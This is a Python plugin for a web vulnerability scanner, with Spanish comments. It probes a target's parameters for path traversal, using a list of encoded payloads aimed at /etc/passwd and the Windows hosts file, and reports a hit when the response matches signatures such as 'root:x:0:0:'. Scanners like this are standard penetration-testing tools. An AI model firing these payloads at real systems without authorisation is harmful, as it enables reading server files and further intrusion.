#!/usr/bin/env python3
"""plugins/traversal.py - Detección de Path Traversal"""

import re
from typing import Dict, List
from core.context import Context

TRAVERSAL_PAYLOADS = [
    '../../../../etc/passwd',
    '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252f..%252fetc%252fpasswd',
    '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '..%255c..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts',
]

TRAVERSAL_PATTERNS = [
    re.compile(r'root:x:0:0:', re.IGNORECASE),
    re.compile(r'\[drivers\]', re.IGNORECASE),
    re.compile(r'127\.0\.0\.1\s+localhost', re.IGNORECASE),
    re.compile(r'# Copyright.*Microsoft', re.IGNORECASE),
]


def run(ctx: Context) -> Dict:
    """Detecta Path Traversal"""
    target = ctx.target
    findings = []
    
    ctx.log('info', f"Analizando Path Traversal en {target}")
    
    params = ctx.get('discovered_params', [])
    if not params:
        params = [
            {'url': target, 'param': 'file', 'method': 'GET'},
            {'url': target, 'param': 'path', 'method': 'GET'},
            {'url': target, 'param': 'dir', 'method': 'GET'},
            {'url': target, 'param': 'folder', 'method': 'GET'},
            {'url': target, 'param': 'template', 'method': 'GET'},
        ]
    
    for param_info in params[:8]:
        if ctx.stopped:
            break
        
        url = param_info['url']
        param = param_info['param']
        method = param_info.get('method', 'GET')
        
        for payload in TRAVERSAL_PAYLOADS[:6]:
            if ctx.stopped:
                break
            
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
            
            try:
                resp = ctx.req(method, test_url, timeout=10)
                content = resp.text
                
                for pattern in TRAVERSAL_PATTERNS:
                    if pattern.search(content):
                        findings.append({
                            'type': 'path_traversal',
                            'severity': 'high',
                            'title': 'Path Traversal',
                            'detail': f"Traversal exitoso en parámetro '{param}'",
                            'evidence': {
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'method': method,
                                'matched': pattern.pattern
                            },
                            'url': test_url
                        })
                        ctx.log('ok', f"Path Traversal en {param}")
                        break
                        
            except Exception as e:
                ctx.log('warn', f"Error probando traversal en {param}: {e}")
    
    return {'findings': findings}


__version__ = "1.0.0"
__author__ = "HT Team"
PHASE = "attack"
REQUIRES = ["crawler"]